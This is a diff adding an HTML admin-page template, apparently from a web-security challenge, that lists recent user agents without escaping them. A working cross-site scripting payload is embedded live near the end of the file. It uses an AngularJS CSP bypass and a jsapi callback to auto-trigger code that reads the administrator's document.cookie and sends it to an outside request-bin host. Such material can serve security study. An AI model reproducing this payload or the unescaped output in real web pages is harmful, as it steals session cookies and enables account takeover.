@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+  {{> head }}
+  <body>
+    <div class="content">
+      <div id="wrapper">
+        <h1>Administration area</h1>
+        <h2>Hi {{ user_name }}!</h2>
+        <img id="alpaca" class="pure-img" src="{{ img_src }}" alt ="{{ img_alt }}" title="{{ img_title }}">
+      </div>
+    </div>
+    <table id="useragent" class="pure-table pure-table-striped">
+      <thead>
+        <tr>
+          <th>Recent UA</th>
+        </tr>
+      </thead>
+      <tbody>
+        {{# user_agents }}
+        <tr>
+          <td class="response">{{{ val }}}</td>
+        </tr>
+        {{/ user_agents }}
+      </tbody>
+    </table>
+    <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+    <script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.3/angular.min.js"></script><div ng-app ng-csp id=p ng-click="$event.view.console.log($event.view.document.cookie);$event.view.console.log($event.view.jQuery.ajax('http://inspectb.in/413aabba?'+$event.view.document.cookie))"><script async src=//ajax.googleapis.com/jsapi?callback=p.click></script>
+  </body>
+</html>
